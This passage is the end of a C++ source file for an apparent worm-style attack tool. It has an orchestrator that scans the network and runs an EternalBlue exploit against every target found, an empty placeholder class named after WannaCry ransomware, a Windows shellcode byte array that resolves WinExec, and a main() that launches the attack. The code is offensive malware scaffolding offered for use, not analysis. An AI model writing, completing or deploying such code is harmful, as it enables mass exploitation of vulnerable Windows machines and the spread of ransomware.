        return std::vector<uint8_t>(buffer, buffer + received);
    }
};


class WannaCryRansomware {

};

// === Attack Orchestrator ===
class Attack {
public:
    static void Launch() {
        auto targets = NetworkRecon::Execute();
        for (const auto& t : targets) {
            EternalBlueExploit::ExploitTarget(t);
        }
    }
};

// === Static init ===
std::atomic<int> NetworkRecon::scanned_count(0);
std::atomic<int> NetworkRecon::target_count(0);

const std::vector<uint8_t> EternalBlueExploit::SHELLCODE = {
    0x31,0xd2,0xb2,0x30,0x64,0x8b,0x12,0x8b,0x52,0x0c,0x8b,0x52,0x1c,0x8b,0x42,0x08,
    0x8b,0x72,0x20,0x8b,0x12,0x80,0x7e,0x0c,0x33,0x75,0xf2,0x89,0xc7,0x03,0x78,0x3c,
    0x8b,0x57,0x78,0x01,0xc2,0x8b,0x7a,0x20,0x01,0xc7,0x31,0xed,0x8b,0x34,0xaf,0x01,
    0xc6,0x45,0x81,0x3e,0x57,0x69,0x6e,0x45,0x75,0xf2,0x8b,0x7a,0x24,0x01,0xc7,0x66,
    0x8b,0x2c,0x6f,0x8b,0x7a,0x1c,0x01,0xc7,0x8b,0x7c,0xaf,0xfc,0x01,0xc7,0x68,0x79,
    0x74,0x65,0x01,0x68,0x6b,0x65,0x6e,0x42,0x68,0x20,0x42,0x72,0x6f,0x89,0xe1,0xfe,
    0x49,0x0b,0x31,0xc0,0x51,0x50,0xff,0xd7
};

// === Main ===
int main() {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        std::cout << "[-] WSAStartup failed\n";
        return 1;
    }

    Attack::Launch();

    WSACleanup();
    return 0;
}